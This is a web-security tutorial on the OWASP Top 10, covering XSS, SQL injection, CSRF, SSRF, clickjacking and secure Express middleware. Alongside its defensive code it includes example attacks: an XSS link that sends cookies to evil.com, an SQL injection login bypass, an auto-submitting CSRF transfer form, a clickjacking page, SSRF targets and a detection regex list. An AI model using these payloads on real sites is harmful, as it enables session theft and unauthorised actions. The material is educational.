---
title: Web Security Fundamentals
description: Master OWASP Top 10 common vulnerabilities and their protection methods
track: security
section: web-security
difficulty: intermediate
tags:
  - web-security
  - OWASP
  - XSS
  - SQL-injection
status: imported
origin: old/src/content/docs/security/web-security-fundamentals.en.md
divergence: 0.208
issues:
  - missing-subcategory-en
  - order-mismatch
  - category-casing
legacy:
  category: security
  subcategory: ""
  order: 1
  lastUpdated: 2026-01-07
---

Web security is one of the most critical areas in modern internet application development. As attack methods continue to evolve, developers must fully understand various security threats and their mitigation measures to build truly secure and reliable applications. This article covers core concepts of web security, common vulnerability types, and best defensive practices.

## Core Concepts

### What is Web Security

Web security is the collection of practices and technologies to protect websites, web applications, and web services from various network threats. It encompasses comprehensive security protection from frontend to backend, from network transmission to data storage.

The three core objectives of web security (CIA Triad):

- **Confidentiality**: Ensure that sensitive information can only be accessed by authorized users
- **Integrity**: Ensure data is not tampered with during transmission and storage
- **Availability**: Ensure systems and services remain continuously available

### Security Threat Model

When conducting security analysis, we need to consider the following threat sources:

```
┌─────────────────────────────────────────────────────────┐
│              Threat Source Classification                │
├─────────────────────────────────────────────────────────┤
│  External Attackers  │  Malicious users, hackers, competitors      │
│  Internal Threats    │  Malicious employees, operational errors    │
│  Automated Attacks   │  Bots, crawlers, DDoS                       │
│  Supply Chain        │  Third-party library vulnerabilities, dependencies │
└─────────────────────────────────────────────────────────┘
```

## OWASP Top 10 Detailed Explanation

OWASP (Open Web Application Security Project) is a non-profit organization focused on improving software security. The OWASP Top 10 is the most authoritative ranking of web application security risks and is updated every few years.

### 2021 OWASP Top 10 Overview

| Rank | Risk Category | Description |
|------|----------|------|
| A01 | Broken Access Control | Users can perform operations beyond their permissions |
| A02 | Cryptographic Failures | Sensitive data exposure, weak encryption algorithms |
| A03 | Injection | SQL, NoSQL, OS command injection, etc. |
| A04 | Insecure Design | Security flaws at architecture and design level |
| A05 | Security Misconfiguration | Default configuration, improper permission settings |
| A06 | Vulnerable and Outdated Components | Using third-party libraries with known vulnerabilities |
| A07 | Authentication and Identification Failure | Weak passwords, improper session management |
| A08 | Software and Data Integrity Failures | Insecure CI/CD, unverified updates |
| A09 | Logging and Monitoring Failures | Lack of effective logging and alerting |
| A10 | Server-Side Request Forgery (SSRF) | Malicious requests initiated by the server |

### A01: Broken Access Control

Access control ensures that users can only access resources they are authorized to use. Common access control vulnerabilities include:

```javascript
// Dangerous example: directly using user input ID to query data
app.get('/api/user/:id', (req, res) => {
  const userId = req.params.id;
  // No verification that current user has permission to access this user's data
  const user = db.users.findById(userId);
  res.json(user);
});

// Safe example: verify access permissions
app.get('/api/user/:id', authenticate, (req, res) => {
  const userId = req.params.id;
  const currentUser = req.user;

  // Only allow users to access their own data or admins to access all data
  if (currentUser.id !== userId && !currentUser.isAdmin) {
    return res.status(403).json({ error: 'Unauthorized access' });
  }

  const user = db.users.findById(userId);
  res.json(user);
});
```

### A02: Cryptographic Failures

Protecting sensitive data requires proper use of cryptographic techniques:

```javascript
const crypto = require('crypto');
const bcrypt = require('bcrypt');

// Password hashing - using bcrypt
async function hashPassword(password) {
  const saltRounds = 12;
  return await bcrypt.hash(password, saltRounds);
}

async function verifyPassword(password, hash) {
  return await bcrypt.compare(password, hash);
}

// Symmetric encryption - using AES-256-GCM
function encrypt(text, key) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);

  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');

  const authTag = cipher.getAuthTag();

  return {
    iv: iv.toString('hex'),
    encrypted: encrypted,
    authTag: authTag.toString('hex')
  };
}

function decrypt(encryptedData, key) {
  const decipher = crypto.createDecipheriv(
    'aes-256-gcm',
    key,
    Buffer.from(encryptedData.iv, 'hex')
  );

  decipher.setAuthTag(Buffer.from(encryptedData.authTag, 'hex'));

  let decrypted = decipher.update(encryptedData.encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');

  return decrypted;
}
```

## XSS Attacks and Protection

Cross-Site Scripting (XSS) is one of the most common web security vulnerabilities. Attackers inject malicious scripts into web pages, which execute in users' browsers when they visit the page.

### XSS Attack Types

#### Reflected XSS

Reflected XSS originates from the current HTTP request, typically passed through URL parameters:

```javascript
// Dangerous example: directly inserting URL parameters into page (DO NOT DO THIS!)
// URL: https://example.com/search?q=<script>alert('XSS')</script>
// If the q parameter is directly rendered to the page, it will cause script execution

// Example of malicious link constructed by attacker:
// https://example.com/search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

#### Stored XSS

Stored XSS involves malicious scripts permanently stored on the target server:

```javascript
// Dangerous example: user comments stored and displayed without filtering
app.post('/api/comments', (req, res) => {
  const comment = req.body.comment;
  // Directly storing user input (dangerous!)
  db.comments.insert({ text: comment, userId: req.user.id });
  res.json({ success: true });
});

// If the frontend renders unfiltered comments, it will cause XSS
```

#### DOM-based XSS

DOM-based XSS occurs entirely on the client side, with malicious scripts executing through DOM environment modifications:

```javascript
// Dangerous example: using unsafe DOM operations (DO NOT DO THIS!)
// If URL hash is directly inserted into DOM, attacker can construct:
// https://example.com/page#<img src=x onerror="alert('XSS')">
```

### XSS Prevention Measures

#### Output Encoding

```javascript
// HTML entity encoding
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, char => map[char]);
}

// JavaScript string encoding
function escapeJs(text) {
  return text
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "\\'")
    .replace(/"/g, '\\"')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r');
}

// URL encoding
function escapeUrl(text) {
  return encodeURIComponent(text);
}
```

#### Using Safe DOM APIs

```javascript
// Safe: use textContent to set plain text
element.textContent = userInput;

// Safe: use DOM API to create elements
const div = document.createElement('div');
div.textContent = userInput;
container.appendChild(div);

// Safe: use setAttribute to set attributes
element.setAttribute('data-value', userInput);

// If HTML processing is necessary, use libraries like DOMPurify for sanitization
const clean = DOMPurify.sanitize(dirtyHtml);
```

#### Content Security Policy (CSP)

```javascript
// Configure CSP in Express.js
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'nonce-randomNonce123'"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'", "https://api.example.com"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],
    frameSrc: ["'none'"],
    upgradeInsecureRequests: []
  }
}));
```

```html
<!-- Use nonce in HTML -->
<script nonce="randomNonce123">
  // Only scripts with correct nonce can execute
  console.log('This script is allowed');
</script>
```

## SQL Injection and Protection

SQL injection is an attack that manipulates database queries by inserting malicious SQL code into user input.

### SQL Injection Attack Example

```javascript
// Dangerous example: constructing SQL with string concatenation (NEVER DO THIS!)
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;

  // Extremely dangerous! Attacker can input:
  // username: admin' --
  // password: anything
  // This bypasses password verification

  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
  // This code is for demonstration only - never use this in production
});
```

### SQL Injection Prevention Measures

#### Parameterized Queries (Prepared Statements)

```javascript
// MySQL - using parameterized queries
const mysql = require('mysql2/promise');

async function login(username, password) {
  const connection = await mysql.createConnection(config);

  // Safe: using placeholders
  const [rows] = await connection.execute(
    'SELECT * FROM users WHERE username = ? AND password = ?',
    [username, password]
  );

  return rows;
}

// PostgreSQL - using parameterized queries
const { Pool } = require('pg');
const pool = new Pool(config);

async function getUser(userId) {
  // Safe: using $1, $2 etc. placeholders
  const result = await pool.query(
    'SELECT * FROM users WHERE id = $1',
    [userId]
  );
  return result.rows[0];
}
```

#### ORM Frameworks

```javascript
// Using Sequelize ORM
const { User } = require('./models');

async function findUser(username) {
  // ORM automatically handles parameterization
  const user = await User.findOne({
    where: { username: username }
  });
  return user;
}

// Using Prisma ORM
const { PrismaClient } = require('@prisma/client');
const prisma = new PrismaClient();

async function getUsers(role) {
  const users = await prisma.user.findMany({
    where: { role: role }
  });
  return users;
}
```

#### Input Validation

```javascript
const Joi = require('joi');

// Define validation schema
const userSchema = Joi.object({
  username: Joi.string()
    .alphanum()
    .min(3)
    .max(30)
    .required(),

  email: Joi.string()
    .email()
    .required(),

  age: Joi.number()
    .integer()
    .min(0)
    .max(150)
});

// Validate input
function validateUser(userData) {
  const { error, value } = userSchema.validate(userData);

  if (error) {
    throw new Error(`Validation failed: ${error.details[0].message}`);
  }

  return value;
}
```

## CSRF Protection

Cross-Site Request Forgery (CSRF) is an attack where an attacker tricks users into performing unintended operations in an authenticated web application.

### CSRF Attack Mechanism

```html
<!-- Malicious page on attacker's website -->
<html>
<body>
  <h1>Congratulations! You've won a prize!</h1>

  <!-- Hidden form auto-submits -->
  <form id="csrf-form" action="https://bank.com/transfer" method="POST" style="display:none;">
    <input name="to" value="attacker-account">
    <input name="amount" value="10000">
  </form>

  <script>
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>
```

### CSRF Protection Measures

#### CSRF Token

```javascript
const csrf = require('csurf');
const cookieParser = require('cookie-parser');

app.use(cookieParser());
app.use(csrf({ cookie: true }));

// Include CSRF token in form
app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

// Verify CSRF token
app.post('/transfer', (req, res) => {
  // csurf middleware automatically verifies the token
  // Throws error if verification fails
  processTransfer(req.body);
  res.json({ success: true });
});
```

```html
<!-- Form template -->
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="{{csrfToken}}">
  <input type="text" name="to" placeholder="Recipient account">
  <input type="number" name="amount" placeholder="Amount">
  <button type="submit">Transfer</button>
</form>
```

#### SameSite Cookie Attribute

```javascript
// Set SameSite Cookie
app.use(session({
  secret: 'your-secret-key',
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: true,  // HTTPS only
    sameSite: 'strict',  // or 'lax'
    maxAge: 24 * 60 * 60 * 1000  // 24 hours
  }
}));
```

#### Validate Origin/Referer Headers

```javascript
function validateOrigin(req, res, next) {
  const origin = req.headers.origin;
  const referer = req.headers.referer;

  const allowedOrigins = ['https://example.com', 'https://www.example.com'];

  if (origin && !allowedOrigins.includes(origin)) {
    return res.status(403).json({ error: 'Illegal request origin' });
  }

  if (referer) {
    const refererOrigin = new URL(referer).origin;
    if (!allowedOrigins.includes(refererOrigin)) {
      return res.status(403).json({ error: 'Illegal request origin' });
    }
  }

  next();
}

app.post('/api/*', validateOrigin);
```

## SSRF Attacks

Server-Side Request Forgery (SSRF) allows attackers to trick the server into making requests to internal or external systems.

### SSRF Attack Example

```javascript
// Dangerous example: allowing users to specify arbitrary URLs (DO NOT DO THIS!)
app.get('/api/fetch', async (req, res) => {
  const url = req.query.url;

  // Attacker can request internal services, for example:
  // ?url=http://169.254.169.254/latest/meta-data/ (cloud metadata)
  // ?url=http://localhost:6379/ (internal Redis)
  // ?url=file:///etc/passwd (local files)

  const response = await fetch(url);
  const data = await response.text();
  res.send(data);
});
```

### SSRF Protection Measures

```javascript
const { URL } = require('url');
const dns = require('dns').promises;
const ipaddr = require('ipaddr.js');

// Safe URL fetching function
async function safeFetch(userUrl) {
  // 1. Parse URL
  let parsedUrl;
  try {
    parsedUrl = new URL(userUrl);
  } catch (e) {
    throw new Error('Invalid URL');
  }

  // 2. Only allow HTTP/HTTPS protocols
  if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
    throw new Error('Only HTTP/HTTPS protocols allowed');
  }

  // 3. Whitelist domain check
  const allowedDomains = ['api.example.com', 'cdn.example.com'];
  if (!allowedDomains.includes(parsedUrl.hostname)) {
    throw new Error('Domain not allowed');
  }

  // 4. DNS resolution check (prevent DNS rebinding)
  const addresses = await dns.resolve4(parsedUrl.hostname);

  for (const addr of addresses) {
    const ip = ipaddr.parse(addr);

    // Check if private/reserved IP
    if (ip.range() !== 'unicast') {
      throw new Error('Internal addresses not allowed');
    }

    // Check if localhost
    const privateRanges = [
      '10.0.0.0/8',
      '172.16.0.0/12',
      '192.168.0.0/16',
      '127.0.0.0/8',
      '169.254.0.0/16'
    ];

    for (const range of privateRanges) {
      if (ip.match(ipaddr.parseCIDR(range))) {
        throw new Error('Private addresses not allowed');
      }
    }
  }

  // 5. Make request
  const response = await fetch(userUrl, {
    timeout: 5000,
    redirect: 'error'  // Disable redirects
  });

  return response;
}
```

## Clickjacking

Clickjacking is a visual deception attack where an attacker embeds the target website in a transparent iframe to trick users into clicking.

### Clickjacking Attack Example

```html
<!-- Attacker's website -->
<html>
<head>
  <style>
    .overlay {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 1;
    }

    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      opacity: 0;  /* transparent */
      z-index: 2;
    }
  </style>
</head>
<body>
  <div class="overlay">
    <h1>Click here to claim your prize!</h1>
    <button>Claim Now</button>
  </div>

  <!-- Transparent target website iframe -->
  <iframe src="https://bank.com/transfer?to=attacker&amount=10000"></iframe>
</body>
</html>
```

### Clickjacking Protection

```javascript
// 1. X-Frame-Options header
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  // or 'SAMEORIGIN' to allow same-origin embedding
  next();
});

// 2. Content-Security-Policy frame-ancestors
app.use(helmet.contentSecurityPolicy({
  directives: {
    frameAncestors: ["'none'"]
    // or ["'self'"] to allow same-origin
    // or ["'self'", "https://trusted.com"]
  }
}));
```

```javascript
// 3. JavaScript protection (as fallback)
// Check if page is embedded in iframe on load
if (self !== top) {
  // Page is embedded in iframe, try to break out
  top.location = self.location;
}
```

## Security Header Configuration

Properly configuring HTTP security headers is an effective way to defend against multiple attacks.

### Complete Security Header Configuration

```javascript
const helmet = require('helmet');

app.use(helmet());

// or manually configure each header
app.use((req, res, next) => {
  // Prevent XSS
  res.setHeader('X-XSS-Protection', '1; mode=block');

  // Prevent MIME type sniffing
  res.setHeader('X-Content-Type-Options', 'nosniff');

  // Prevent clickjacking
  res.setHeader('X-Frame-Options', 'DENY');

  // Control Referer information
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

  // Force HTTPS
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');

  // Limit browser capabilities
  res.setHeader('Permissions-Policy',
    'accelerometer=(), camera=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), payment=(), usb=()');

  // Content Security Policy
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self' 'nonce-randomValue'; " +
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: https:; " +
    "font-src 'self'; " +
    "connect-src 'self' https://api.example.com; " +
    "frame-ancestors 'none'; " +
    "base-uri 'self'; " +
    "form-action 'self'"
  );

  next();
});
```

### Security Header Checklist

| Header | Purpose | Recommended Value |
|------|------|--------|
| Content-Security-Policy | Prevent XSS, data injection | Configure as needed |
| Strict-Transport-Security | Force HTTPS | max-age=31536000; includeSubDomains |
| X-Content-Type-Options | Prevent MIME sniffing | nosniff |
| X-Frame-Options | Prevent clickjacking | DENY or SAMEORIGIN |
| X-XSS-Protection | XSS filter | 1; mode=block |
| Referrer-Policy | Control Referer | strict-origin-when-cross-origin |
| Permissions-Policy | Limit browser capabilities | Disable unnecessary APIs |

## Secure Coding Practices

### Input Validation

```javascript
const validator = require('validator');

// Comprehensive input validation function
function validateInput(input, type) {
  if (typeof input !== 'string') {
    return { valid: false, error: 'Input must be a string' };
  }

  // Trim whitespace
  input = input.trim();

  // Length check
  if (input.length === 0) {
    return { valid: false, error: 'Input cannot be empty' };
  }

  if (input.length > 10000) {
    return { valid: false, error: 'Input too long' };
  }

  switch (type) {
    case 'email':
      if (!validator.isEmail(input)) {
        return { valid: false, error: 'Invalid email format' };
      }
      break;

    case 'url':
      if (!validator.isURL(input, {
        protocols: ['http', 'https'],
        require_protocol: true
      })) {
        return { valid: false, error: 'Invalid URL' };
      }
      break;

    case 'alphanumeric':
      if (!validator.isAlphanumeric(input)) {
        return { valid: false, error: 'Only letters and numbers allowed' };
      }
      break;

    case 'integer':
      if (!validator.isInt(input)) {
        return { valid: false, error: 'Must be an integer' };
      }
      break;
  }

  return { valid: true, value: input };
}
```

### Secure File Upload

```javascript
const multer = require('multer');
const path = require('path');
const crypto = require('crypto');

// Configure file upload
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, '/secure/uploads/');
  },
  filename: (req, file, cb) => {
    // Generate random filename to prevent path traversal
    const randomName = crypto.randomBytes(32).toString('hex');
    const ext = path.extname(file.originalname).toLowerCase();
    cb(null, `${randomName}${ext}`);
  }
});

// File filter
const fileFilter = (req, file, cb) => {
  // Allowed MIME types
  const allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];

  // Allowed extensions
  const allowedExts = ['.jpg', '.jpeg', '.png', '.gif'];

  const ext = path.extname(file.originalname).toLowerCase();

  if (allowedMimes.includes(file.mimetype) && allowedExts.includes(ext)) {
    cb(null, true);
  } else {
    cb(new Error('File type not allowed'), false);
  }
};

const upload = multer({
  storage: storage,
  fileFilter: fileFilter,
  limits: {
    fileSize: 5 * 1024 * 1024,  // 5MB
    files: 1
  }
});

// Validate file content after upload
const fileType = require('file-type');
const fs = require('fs').promises;

async function validateFileContent(filePath) {
  const buffer = await fs.readFile(filePath);
  const type = await fileType.fromBuffer(buffer);

  if (!type || !['image/jpeg', 'image/png', 'image/gif'].includes(type.mime)) {
    await fs.unlink(filePath);
    throw new Error('File content does not match extension');
  }

  return true;
}
```

### Secure Session Management

```javascript
const session = require('express-session');
const RedisStore = require('connect-redis').default;
const redis = require('redis');

const redisClient = redis.createClient();

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,  // Use environment variables
  name: 'sessionId',  // Custom cookie name
  resave: false,
  saveUninitialized: false,
  rolling: true,  // Reset expiration on each request
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 30 * 60 * 1000,  // 30 minutes
    domain: '.example.com',
    path: '/'
  }
}));

// Regenerate session ID on login (prevent session fixation)
app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body);

  if (user) {
    // Regenerate session ID
    req.session.regenerate((err) => {
      if (err) {
        return res.status(500).json({ error: 'Session creation failed' });
      }

      req.session.userId = user.id;
      req.session.loginTime = Date.now();

      res.json({ success: true });
    });
  }
});

// Destroy session on logout
app.post('/logout', (req, res) => {
  req.session.destroy((err) => {
    res.clearCookie('sessionId');
    res.json({ success: true });
  });
});
```

### Error Handling and Logging

```javascript
const winston = require('winston');

// Configure logger
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'security.log', level: 'warn' }),
    new winston.transports.File({ filename: 'combined.log' })
  ]
});

// Security event logging
function logSecurityEvent(event, req, details = {}) {
  logger.warn({
    event: event,
    ip: req.ip,
    userAgent: req.headers['user-agent'],
    userId: req.session?.userId,
    path: req.path,
    method: req.method,
    timestamp: new Date().toISOString(),
    ...details
  });
}

// Global error handler
app.use((err, req, res, next) => {
  // Log error
  logger.error({
    message: err.message,
    stack: err.stack,
    path: req.path,
    method: req.method,
    ip: req.ip
  });

  // Don't expose detailed error information to users
  res.status(500).json({
    error: 'Internal server error',
    requestId: req.id  // For tracking
  });
});

// Monitor suspicious activity
function detectSuspiciousActivity(req, res, next) {
  const suspiciousPatterns = [
    /(<script|javascript:|on\w+=)/i,  // XSS attempts
    /(union.*select|or.*1.*=.*1)/i,   // SQL injection attempts
    /(\.\.\/|\.\.\\)/,                 // Path traversal
  ];

  const input = JSON.stringify(req.body) + JSON.stringify(req.query);

  for (const pattern of suspiciousPatterns) {
    if (pattern.test(input)) {
      logSecurityEvent('SUSPICIOUS_INPUT', req, { pattern: pattern.toString() });
      break;
    }
  }

  next();
}
```

## Code Example: Complete Security Middleware

```javascript
// security-middleware.js
const rateLimit = require('express-rate-limit');
const slowDown = require('express-slow-down');
const helmet = require('helmet');
const hpp = require('hpp');
const mongoSanitize = require('express-mongo-sanitize');

function setupSecurityMiddleware(app) {
  // 1. Basic security headers
  app.use(helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        scriptSrc: ["'self'"],
        imgSrc: ["'self'", "data:", "https:"],
        connectSrc: ["'self'"],
        fontSrc: ["'self'"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'"],
        frameSrc: ["'none'"]
      }
    },
    crossOriginEmbedderPolicy: true,
    crossOriginOpenerPolicy: true,
    crossOriginResourcePolicy: { policy: "same-site" },
    dnsPrefetchControl: true,
    frameguard: { action: 'deny' },
    hidePoweredBy: true,
    hsts: true,
    ieNoOpen: true,
    noSniff: true,
    originAgentCluster: true,
    permittedCrossDomainPolicies: true,
    referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
    xssFilter: true
  }));

  // 2. Rate limiting
  const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,  // 15 minutes
    max: 100,  // 100 requests per IP
    message: { error: 'Too many requests, please try again later' },
    standardHeaders: true,
    legacyHeaders: false
  });

  app.use('/api/', limiter);

  // 3. Stricter limit for login endpoint
  const loginLimiter = rateLimit({
    windowMs: 60 * 60 * 1000,  // 1 hour
    max: 5,  // 5 attempts
    message: { error: 'Too many login attempts, please try again after 1 hour' }
  });

  app.use('/api/login', loginLimiter);

  // 4. Slow down requests (progressive delay)
  const speedLimiter = slowDown({
    windowMs: 15 * 60 * 1000,
    delayAfter: 50,
    delayMs: () => 500
  });

  app.use(speedLimiter);

  // 5. HTTP Parameter Pollution protection
  app.use(hpp());

  // 6. NoSQL injection protection
  app.use(mongoSanitize());

  // 7. Request size limit
  app.use(express.json({ limit: '10kb' }));
  app.use(express.urlencoded({ extended: true, limit: '10kb' }));

  // 8. Trust proxy (if behind proxy)
  app.set('trust proxy', 1);

  return app;
}

module.exports = setupSecurityMiddleware;
```

## Interview Key Points

### Common Interview Questions and Answers

**Q1: What is an XSS attack? How do you prevent it?**

A: XSS (Cross-Site Scripting) is an attack where attackers inject malicious scripts into web pages. There are three types:
- Reflected: Malicious script passed through URL parameters
- Stored: Malicious script stored in server database
- DOM-based: Occurs entirely on client side

Prevention measures:
1. Output encoding (HTML/JS/URL encoding)
2. Use safe DOM APIs (textContent instead of unsafe methods)
3. Configure Content-Security-Policy
4. Set HttpOnly Cookie flag
5. Input validation and filtering

**Q2: What's the difference between CSRF and XSS?**

A:
- XSS: Attacker injects code into target website, code executes in user's browser, stealing user data
- CSRF: Attacker tricks user to visit malicious page, leverages user's login state to perform unintended actions

Key difference: XSS exploits user's trust in website, CSRF exploits website's trust in user

**Q3: How do you prevent SQL injection?**

A:
1. Use parameterized queries/prepared statements
2. Use ORM frameworks
3. Input validation and type checking
4. Principle of least privilege (database user permissions)
5. Escape special characters (last resort)

**Q4: Explain CSP (Content-Security-Policy)**

A: CSP is an HTTP response header declaring which dynamic resources can be loaded and executed. Main directives:
- default-src: Default policy
- script-src: JavaScript sources
- style-src: CSS sources
- img-src: Image sources
- connect-src: XHR/Fetch targets
- frame-ancestors: Who can embed this page

**Q5: What is SSRF? How do you prevent it?**

A: SSRF (Server-Side Request Forgery) is an attack where attackers trick the server into making requests to internal or external systems.

Prevention measures:
1. Whitelist validation for allowed domains
2. Prohibit requests to private IP addresses
3. Disable unnecessary protocols (file://, gopher://)
4. Verify IP after DNS resolution
5. Limit response content types

### Core Knowledge Points

```
┌────────────────────────────────────────────────────────────────┐
│           Web Security Core Knowledge System                    │
├────────────────────────────────────────────────────────────────┤
│  Injection Attacks                                               │
│  ├── SQL Injection → Parameterized queries                      │
│  ├── NoSQL Injection → Input filtering                          │
│  ├── Command Injection → Avoid shell execution                  │
│  └── XSS → Output encoding + CSP                               │
├────────────────────────────────────────────────────────────────┤
│  Authentication & Authorization                                 │
│  ├── Session Management → Secure Cookie config                  │
│  ├── CSRF → Token + SameSite                                    │
│  ├── Access Control → RBAC/ABAC                                 │
│  └── JWT → Secure signature + Short expiry                      │
├────────────────────────────────────────────────────────────────┤
│  Data Protection                                                 │
│  ├── Transport Security → HTTPS + HSTS                          │
│  ├── Storage Security → Encryption + Hashing                    │
│  └── Log Security → Sanitization + Audit                        │
├────────────────────────────────────────────────────────────────┤
│  Configuration Security                                          │
│  ├── Security Headers → Helmet                                  │
│  ├── CORS → Strict configuration                                │
│  └── Dependency Security → Regular updates                      │
└────────────────────────────────────────────────────────────────┘
```

## Further Reading

### Official Resources

- [OWASP Official Website](https://owasp.org/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)

### Tools and Frameworks

- [OWASP ZAP](https://www.zaproxy.org/) - Open source web security scanner
- [Burp Suite](https://portswigger.net/burp) - Professional web security testing tool
- [Helmet.js](https://helmetjs.github.io/) - Express security middleware
- [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/) - Dependency vulnerability scanner

### Learning Platforms

- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - Free online labs
- [Hack The Box](https://www.hackthebox.com/) - Penetration testing practice platform
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/) - Deliberately vulnerable learning application

### Advanced Topics

- **API Security**: OAuth 2.0, API gateways, rate limiting
- **Container Security**: Docker security configuration, Kubernetes security
- **Cloud Security**: AWS/Azure/GCP security best practices
- **DevSecOps**: Security left shift, automated security testing, SAST/DAST

## Summary

Web security is a continuously evolving field that requires developers to remain vigilant and keep learning. The OWASP Top 10 introduced in this article covers the most common security risks, and mastering this knowledge is fundamental to building secure web applications.

Key points:
1. **Defense in Depth**: Don't rely on a single security measure
2. **Principle of Least Privilege**: Only grant necessary permissions
3. **Secure by Default**: Security configuration should be the default option
4. **Continuous Monitoring**: Promptly detect and respond to security incidents
5. **Security Updates**: Regularly update dependencies and system components

Security is not a one-time effort, but a continuous practice that must be integrated throughout the software development lifecycle.
